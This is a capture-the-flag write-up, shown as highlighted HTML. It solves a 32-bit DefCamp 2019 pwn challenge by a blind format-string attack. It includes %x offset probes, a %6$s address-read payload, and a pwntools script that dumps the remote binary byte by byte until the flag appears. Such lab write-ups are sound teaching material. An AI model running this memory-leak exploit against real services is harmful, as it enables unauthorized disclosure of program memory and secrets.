I"hx<p>A classic blind format string challenge where you had to dump the entire binary to get the flag.</p>

<h3 id="challenge">Challenge</h3>

<ul>
  <li><strong>Category:</strong> pwn</li>
  <li><strong>Points:</strong> 105</li>
  <li><strong>Solves:</strong> 68</li>
</ul>

<blockquote>
  <p>Can you pwn this?</p>

  <p>Target: 206.81.24.129:1337</p>

  <p>Author: Andrei</p>
</blockquote>

<h3 id="solution">Solution</h3>

<p>Before continuing, I highly suggest watching <a href="https://www.youtube.com/watch?v=XuzuFUGuQv0">LiveOverflow’s video of the ESPR challenge from 33c3ctf</a> if you aren’t familiar with blind format string attacks. That is basically a harder version of this challenge and uses a 64-bit binary, whereas this challenge incorporates a 32-bit binary.</p>

<p>To start with, right off the bat we see a format string vulnerability in the <code class="highlighter-rouge">username</code> field. The <code class="highlighter-rouge">password</code> is what shows up on the stack (unaligned) at the second half of the 5th offset and onwards.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vagrant</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">-</span><span class="n">bionic</span><span class="o">:/</span><span class="n">ctf</span><span class="o">/</span><span class="n">pwn</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">rev</span><span class="o">/</span><span class="n">defcamp</span><span class="o">-</span><span class="mi">2019</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">get</span><span class="o">-</span><span class="n">access</span><span class="err">$</span> <span class="n">nc</span> <span class="mi">206</span><span class="p">.</span><span class="mi">81</span><span class="p">.</span><span class="mi">24</span><span class="p">.</span><span class="mi">129</span> <span class="mi">1337</span>
<span class="n">You</span> <span class="n">must</span> <span class="n">login</span> <span class="n">first</span> <span class="n">before</span> <span class="n">get</span> <span class="n">the</span> <span class="n">flag</span>
<span class="n">Enter</span> <span class="n">username</span><span class="o">:</span><span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="n">x</span> <span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="n">x</span> <span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="n">x</span> <span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="n">x</span> <span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="n">x</span> <span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="n">x</span> <span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="n">x</span> <span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="n">x</span>
<span class="n">Enter</span> <span class="n">password</span><span class="o">:</span><span class="n">AAAABBBBCCCCDDDD</span>
<span class="mh">0xffd9dc76</span> <span class="mh">0x2a</span> <span class="mh">0x8ec2008</span> <span class="mh">0x0</span> <span class="mh">0x4141dd14</span> <span class="mh">0x42424141</span> <span class="mh">0x43434242</span> <span class="mh">0x44444343</span> <span class="n">does</span> <span class="n">not</span> <span class="n">have</span> <span class="n">access</span><span class="o">!</span>
</code></pre></div></div>

<p>So we know we can control the 6th offset by padding our password input with two characters before it. What that means is if we enter the password <code class="highlighter-rouge">BBAAAA</code>, we should see <code class="highlighter-rouge">0x41414141</code> at <code class="highlighter-rouge">%6$x</code>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vagrant</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">-</span><span class="n">bionic</span><span class="o">:/</span><span class="n">ctf</span><span class="o">/</span><span class="n">pwn</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">rev</span><span class="o">/</span><span class="n">defcamp</span><span class="o">-</span><span class="mi">2019</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">get</span><span class="o">-</span><span class="n">access</span><span class="err">$</span> <span class="n">nc</span> <span class="mi">206</span><span class="p">.</span><span class="mi">81</span><span class="p">.</span><span class="mi">24</span><span class="p">.</span><span class="mi">129</span> <span class="mi">1337</span>
<span class="n">You</span> <span class="n">must</span> <span class="n">login</span> <span class="n">first</span> <span class="n">before</span> <span class="n">get</span> <span class="n">the</span> <span class="n">flag</span>
<span class="n">Enter</span> <span class="n">username</span><span class="o">:</span><span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="mi">6</span><span class="err">$</span><span class="n">x</span>
<span class="n">Enter</span> <span class="n">password</span><span class="o">:</span><span class="n">BBAAAA</span>
<span class="mh">0x41414141</span> <span class="n">does</span> <span class="n">not</span> <span class="n">have</span> <span class="n">access</span><span class="o">!</span>
</code></pre></div></div>

<p>I also check to make sure we actually have a 32-bit binary (the <code class="highlighter-rouge">0xffxxxxxx</code> address in the first offset is a dead giveaway) by also trying with <code class="highlighter-rouge">%lx</code> instead of just <code class="highlighter-rouge">%x</code>. <code class="highlighter-rouge">%lx</code> prints out 64-bit addresses.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vagrant</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">-</span><span class="n">bionic</span><span class="o">:/</span><span class="n">ctf</span><span class="o">/</span><span class="n">pwn</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">rev</span><span class="o">/</span><span class="n">defcamp</span><span class="o">-</span><span class="mi">2019</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">get</span><span class="o">-</span><span class="n">access</span><span class="err">$</span> <span class="n">nc</span> <span class="mi">206</span><span class="p">.</span><span class="mi">81</span><span class="p">.</span><span class="mi">24</span><span class="p">.</span><span class="mi">129</span> <span class="mi">1337</span>
<span class="n">You</span> <span class="n">must</span> <span class="n">login</span> <span class="n">first</span> <span class="n">before</span> <span class="n">get</span> <span class="n">the</span> <span class="n">flag</span>
<span class="n">Enter</span> <span class="n">username</span><span class="o">:</span><span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="n">lx</span> <span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="n">lx</span> <span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="n">lx</span> <span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="n">lx</span>
<span class="n">Enter</span> <span class="n">password</span><span class="o">:</span>
<span class="mh">0xff99e676</span> <span class="mh">0x2a</span> <span class="mh">0x8b44008</span> <span class="mh">0x0</span> <span class="n">does</span> <span class="n">not</span> <span class="n">have</span> <span class="n">access</span><span class="o">!</span>
</code></pre></div></div>

<p>Since it still prints out 32-bit addresses, we know the binary is 32-bit. We can know that ASLR is enabled because the address at offset one always changes each time. We also know that 32-bit libc addresses usually start with <code class="highlighter-rouge">0xff</code> so long as PIE is disabled.</p>

<p>Knowing all of this, and the fact that we have a blind format string, the one thing we know is that all 32-bit linux binaries have a base address <code class="highlighter-rouge">0x08048000</code>. What we can then do is start at that address and dump out the binary byte by byte. Note that this <strong><em>ONLY</em></strong> works if PIE is disabled, as otherwise the base address of the binary would be randomized as well.</p>

<p>What we want to do is instead of putting <code class="highlighter-rouge">0x41414141</code> into <code class="highlighter-rouge">%6$x</code>, we want to put <code class="highlighter-rouge">0x08048000</code> into <code class="highlighter-rouge">%6$x</code>, and then dump the binary by doing <code class="highlighter-rouge">%6$s</code> which will dereference <code class="highlighter-rouge">0x08048000</code>. A quick test shows that it works.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'206.81.24.129'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'</span><span class="si">%6</span><span class="s">$s'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'AA'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048000</span><span class="p">))</span>

<span class="k">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</code></pre></div></div>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vagrant</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">-</span><span class="n">bionic</span><span class="o">:/</span><span class="n">ctf</span><span class="o">/</span><span class="n">pwn</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">rev</span><span class="o">/</span><span class="n">defcamp</span><span class="o">-</span><span class="mi">2019</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">get</span><span class="o">-</span><span class="n">access</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">exploit</span><span class="p">.</span><span class="n">py</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="mi">206</span><span class="p">.</span><span class="mi">81</span><span class="p">.</span><span class="mi">24</span><span class="p">.</span><span class="mi">129</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">1337</span><span class="o">:</span> <span class="n">Done</span>
<span class="err">\</span><span class="n">x7fELF</span> <span class="n">does</span> <span class="n">not</span> <span class="n">have</span> <span class="n">access</span><span class="o">!</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Closed</span> <span class="n">connection</span> <span class="n">to</span> <span class="mi">206</span><span class="p">.</span><span class="mi">81</span><span class="p">.</span><span class="mi">24</span><span class="p">.</span><span class="mi">129</span> <span class="n">port</span> <span class="mi">1337</span>
</code></pre></div></div>

<p>It successfully prints out <code class="highlighter-rouge">\x7fELF</code> which are the four bytes every single Linux ELF binary starts out with.</p>

<p>Now we just write a script that will dump bytes from the binary out starting at the base address <code class="highlighter-rouge">0x08048000</code>, then move the address up by the number of bytes dumped, then rinse and repeat. However there are some issues that we have to deal with when dumping the binary this way.</p>

<ul>
  <li>
    <p>Since we are exploiting a format string vulnerability here, remember that <code class="highlighter-rouge">printf</code> will keep printing until it sees a NULL byte, but won’t print out the NULL byte itself. This means that we must include our own NULL byte after each leak, so that when we increase the current address by the number of bytes dumped, <code class="highlighter-rouge">printf</code> doesn’t get stuck on the NULL byte that it doesn’t print out. If we don’t do this, <code class="highlighter-rouge">printf</code> gets stuck in an infinite loop where it stays stuck on the address that contains a NULL byte forever.</p>
  </li>
  <li>
    <p>The second problem is that <code class="highlighter-rouge">fgets</code> or <code class="highlighter-rouge">scanf</code> or whatever the binary is using to take in user input will stop at newlines. What this means is that when we do <code class="highlighter-rouge">%6$s</code> in the username, if the format string ends up dereferencing it and finding a <code class="highlighter-rouge">\n</code>, then the input function will stop there even if there is more data to leak after the newline. My solution to this isn’t the best, but what I did was just take the leak, and if it contains any newline characters, just change the leak to a NULL byte. It causes the binary to be slightly corrupted but remember, we aren’t trying to run the binary here. We should just be able to figure out how to exploit it using the code.</p>
  </li>
</ul>

<p>The following script does the job:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'206.81.24.129'</span><span class="p">,</span> <span class="mi">1337</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>

<span class="n">base</span> <span class="o">=</span> <span class="mh">0x08048000</span> <span class="c1"># base addr of 32 bit binaries without PIE
</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="s">""</span> <span class="c1"># Set leak to an empty string
</span>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"output.raw"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'</span><span class="si">%6</span><span class="s">$s'</span><span class="p">)</span> <span class="c1"># (base + len(leak)) is at offset 6, so %6$s is used
</span>        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'AA'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)))</span> <span class="c1"># Padding required to place the address right
</span>        <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'does'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span> <span class="c1"># Must add NULL byte otherwise printf will hang
</span>        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

        <span class="c1"># Must also replace newlines with \x00, it will cause the binary to be slightly corrupted
</span>        <span class="c1"># which doesn't matter because the flag is in the .bss segment for this binary
</span>        <span class="k">if</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span> <span class="ow">in</span> <span class="n">leak</span><span class="p">:</span>
            <span class="n">leak</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span>

        <span class="c1"># Write to file
</span>        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
        <span class="k">print</span> <span class="n">leak</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span> <span class="o">+</span> <span class="s">" @ "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">)</span>
        <span class="n">base</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
</code></pre></div></div>

<p>After running this script for around 5-10 minutes (I didn’t keep count), I checked the binary with <code class="highlighter-rouge">xxd</code> and saw this.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vagrant</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">-</span><span class="n">bionic</span><span class="o">:/</span><span class="n">ctf</span><span class="o">/</span><span class="n">pwn</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">rev</span><span class="o">/</span><span class="n">defcamp</span><span class="o">-</span><span class="mi">2019</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">get</span><span class="o">-</span><span class="n">access</span><span class="err">$</span> <span class="n">xxd</span> <span class="n">output</span><span class="p">.</span><span class="n">raw</span>
<span class="mo">00000000</span><span class="o">:</span> <span class="mi">7</span><span class="n">f45</span> <span class="mi">4</span><span class="n">c46</span> <span class="mo">0101</span> <span class="mo">0100</span> <span class="mo">0000</span> <span class="mi">286</span><span class="n">e</span> <span class="mi">756</span><span class="n">c</span> <span class="mi">6</span><span class="n">c29</span>  <span class="p">.</span><span class="n">ELF</span><span class="p">......(</span><span class="n">null</span><span class="p">)</span>
<span class="mo">00000010</span><span class="o">:</span> <span class="mo">0000</span> <span class="mo">0300</span> <span class="mo">0100</span> <span class="mo">0000</span> <span class="n">c085</span> <span class="mo">040</span><span class="mi">8</span> <span class="mi">3400</span> <span class="mo">0000</span>  <span class="p">............</span><span class="mi">4</span><span class="p">...</span>
<span class="p">....</span>
<span class="p">....</span>
<span class="mo">00000</span><span class="n">a70</span><span class="o">:</span> <span class="mo">0000</span> <span class="mo">0000</span> <span class="mo">0000</span> <span class="mo">005</span><span class="mi">9</span> <span class="mi">6</span><span class="n">f75</span> <span class="mi">206</span><span class="n">d</span> <span class="mi">7573</span> <span class="mi">7420</span>  <span class="p">.......</span><span class="n">You</span> <span class="n">must</span>
<span class="mo">00000</span><span class="n">a80</span><span class="o">:</span> <span class="mi">6</span><span class="n">c6f</span> <span class="mi">6769</span> <span class="mf">6e20</span> <span class="mi">6669</span> <span class="mi">7273</span> <span class="mi">7420</span> <span class="mi">6265</span> <span class="mi">666</span><span class="n">f</span>  <span class="n">login</span> <span class="n">first</span> <span class="n">befo</span>
<span class="mo">00000</span><span class="n">a90</span><span class="o">:</span> <span class="mi">7265</span> <span class="mi">2067</span> <span class="mi">6574</span> <span class="mi">2074</span> <span class="mi">6865</span> <span class="mi">2066</span> <span class="mi">6</span><span class="n">c61</span> <span class="mi">6700</span>  <span class="n">re</span> <span class="n">get</span> <span class="n">the</span> <span class="n">flag</span><span class="p">.</span>
<span class="mo">00000</span><span class="n">aa0</span><span class="o">:</span> <span class="mi">456</span><span class="n">e</span> <span class="mi">7465</span> <span class="mi">7220</span> <span class="mi">7573</span> <span class="mi">6572</span> <span class="mf">6e61</span> <span class="mi">6</span><span class="n">d65</span> <span class="mi">3</span><span class="n">a00</span>  <span class="n">Enter</span> <span class="n">username</span><span class="o">:</span><span class="p">.</span>
<span class="mo">00000</span><span class="n">ab0</span><span class="o">:</span> <span class="mi">456</span><span class="n">e</span> <span class="mi">7465</span> <span class="mi">7220</span> <span class="mi">7061</span> <span class="mi">7373</span> <span class="mi">776</span><span class="n">f</span> <span class="mi">7264</span> <span class="mi">3</span><span class="n">a00</span>  <span class="n">Enter</span> <span class="n">password</span><span class="o">:</span><span class="p">.</span>
<span class="mo">00000</span><span class="n">ac0</span><span class="o">:</span> <span class="mo">0000</span> <span class="mo">0000</span> <span class="mo">0000</span> <span class="mo">0000</span> <span class="mo">0000</span> <span class="mo">0000</span> <span class="mo">0000</span> <span class="mo">0000</span>  <span class="p">................</span>
<span class="mo">00000</span><span class="n">ad0</span><span class="o">:</span> <span class="mo">0000</span> <span class="mo">0046</span> <span class="mi">6</span><span class="n">c61</span> <span class="mi">6720</span> <span class="mi">6973</span> <span class="mi">3</span><span class="n">a20</span> <span class="mi">4443</span> <span class="mi">5446</span>  <span class="p">...</span><span class="n">Flag</span> <span class="n">is</span><span class="o">:</span> <span class="n">DCTF</span>
<span class="mo">00000</span><span class="n">ae0</span><span class="o">:</span> <span class="mi">7</span><span class="n">b42</span> <span class="mi">4438</span> <span class="mi">4336</span> <span class="mi">3634</span> <span class="mi">4537</span> <span class="mi">3445</span> <span class="mi">4239</span> <span class="mi">3432</span>  <span class="p">{</span><span class="n">BD8C664E74EB942</span>
<span class="mo">00000</span><span class="n">af0</span><span class="o">:</span> <span class="mi">3232</span> <span class="mi">3545</span> <span class="mi">4642</span> <span class="mi">3734</span> <span class="mi">4346</span> <span class="mi">4437</span> <span class="mi">3645</span> <span class="mi">4334</span>  <span class="mi">225</span><span class="n">EFB74CFD76EC4</span>
<span class="mo">00000</span><span class="n">b00</span><span class="o">:</span> <span class="mi">4232</span> <span class="mi">4644</span> <span class="mi">4130</span> <span class="mi">4333</span> <span class="mi">3741</span> <span class="mi">3244</span> <span class="mi">3536</span> <span class="mi">3742</span>  <span class="n">B2FDA0C37A2D567B</span>
<span class="mo">00000</span><span class="n">b10</span><span class="o">:</span> <span class="mi">3730</span> <span class="mi">3741</span> <span class="mi">4131</span> <span class="mi">3430</span> <span class="mi">3737</span> <span class="mi">3831</span> <span class="mi">4646</span> <span class="mi">3737</span>  <span class="mi">707</span><span class="n">AA1407781FF77</span>
<span class="mo">00000</span><span class="n">b20</span><span class="o">:</span> <span class="mi">467</span><span class="n">d</span> <span class="mo">0000</span> <span class="mo">006</span><span class="n">f</span> <span class="mi">6573</span> <span class="mi">206</span><span class="n">e</span> <span class="mi">6</span><span class="n">f74</span> <span class="mi">2068</span> <span class="mi">6176</span>  <span class="n">F</span><span class="p">}...</span><span class="n">oes</span> <span class="n">not</span> <span class="n">hav</span>
<span class="mo">00000</span><span class="n">b30</span><span class="o">:</span> <span class="mi">6520</span> <span class="mi">6163</span> <span class="mi">6365</span> <span class="mi">7373</span> <span class="mi">2100</span> <span class="mo">0001</span> <span class="mi">1</span><span class="n">b03</span> <span class="mi">3</span><span class="n">b38</span>  <span class="n">e</span> <span class="n">access</span><span class="o">!</span><span class="p">.....;</span><span class="mi">8</span>
<span class="mo">00000</span><span class="n">b40</span><span class="o">:</span> <span class="mo">0000</span> <span class="mo">0006</span> <span class="mo">0000</span> <span class="mo">00</span><span class="mi">84</span> <span class="n">f9ff</span> <span class="n">ff54</span> <span class="mo">0000</span> <span class="mo">007</span><span class="n">f</span>  <span class="p">...........</span><span class="n">T</span><span class="p">....</span>
<span class="mo">00000</span><span class="n">b50</span><span class="o">:</span> <span class="n">fbff</span> <span class="n">ff78</span> <span class="mo">0000</span> <span class="mo">00</span><span class="mi">91</span> <span class="n">fbff</span> <span class="n">ff98</span> <span class="mo">0000</span> <span class="mo">00</span><span class="n">b9</span>  <span class="p">...</span><span class="n">x</span><span class="p">............</span>
<span class="mo">00000</span><span class="n">b60</span><span class="o">:</span> <span class="n">fbff</span> <span class="n">ffb8</span> <span class="mo">0000</span> <span class="mo">0064</span> <span class="n">feff</span> <span class="n">fff4</span> <span class="mo">0000</span> <span class="mo">00</span><span class="n">c4</span>  <span class="p">.......</span><span class="n">d</span><span class="p">........</span>
<span class="mo">00000</span><span class="n">b70</span><span class="o">:</span> <span class="n">feff</span> <span class="n">ff40</span> <span class="mo">0100</span> <span class="mo">0014</span> <span class="mo">0000</span> <span class="mo">0000</span> <span class="mo">0000</span> <span class="mo">0001</span>  <span class="p">...</span><span class="err">@</span><span class="p">............</span>
<span class="mo">00000</span><span class="n">b80</span><span class="o">:</span> <span class="mi">7</span><span class="n">a52</span> <span class="mo">0001</span> <span class="mi">7</span><span class="n">c08</span> <span class="mo">011</span><span class="n">b</span> <span class="mi">0</span><span class="n">c04</span> <span class="mo">04</span><span class="mi">88</span> <span class="mo">0100</span> <span class="mo">0020</span>  <span class="n">zR</span><span class="p">..</span><span class="o">|</span><span class="p">..........</span>
<span class="mo">00000</span><span class="n">b90</span><span class="o">:</span> <span class="mo">0000</span> <span class="mo">001</span><span class="n">c</span> <span class="mo">0000</span> <span class="mo">002</span><span class="mi">8</span> <span class="n">f9ff</span> <span class="n">fff0</span> <span class="mo">0000</span> <span class="mo">0000</span>  <span class="p">.......(........</span>
<span class="mo">00000</span><span class="n">ba0</span><span class="o">:</span> <span class="mf">0e08</span> <span class="mi">460</span><span class="n">e</span> <span class="mi">0</span><span class="n">c4a</span> <span class="mi">0</span><span class="n">f0b</span> <span class="mi">7404</span> <span class="mi">7800</span> <span class="mi">3</span><span class="n">f1a</span> <span class="mi">3</span><span class="n">b2a</span>  <span class="p">..</span><span class="n">F</span><span class="p">..</span><span class="n">J</span><span class="p">..</span><span class="n">t</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="o">?</span><span class="p">.;</span><span class="o">*</span>
<span class="mo">00000</span><span class="n">bb0</span><span class="o">:</span> <span class="mi">3224</span> <span class="mi">221</span><span class="n">c</span> <span class="mo">0000</span> <span class="mo">0040</span> <span class="mo">0000</span> <span class="mo">00</span><span class="n">ff</span> <span class="n">faff</span> <span class="n">ff12</span>  <span class="mi">2</span><span class="err">$</span><span class="s">"....@........</span><span class="err">
</span><span class="s">00000bc0: 0000 0000 410e 0885 0242 0d05 4ec5 0c04  ....A....B..N...</span><span class="err">
</span><span class="s">00000bd0: 0400 001c 0000 0060 0000 00f1 faff ff28  .......`.......(</span><span class="err">
</span><span class="s">00000be0: 00</span><span class="err">
</span></code></pre></div></div>

<p>Opening the output file in <code class="highlighter-rouge">vim</code> gives us the flag.</p>

<p>Flag: <code class="highlighter-rouge">DCTF{BD8C664E74EB942225EFB74CFD76EC4B2FDA0C37A2D567B707AA1407781FF77F}</code></p>
:ET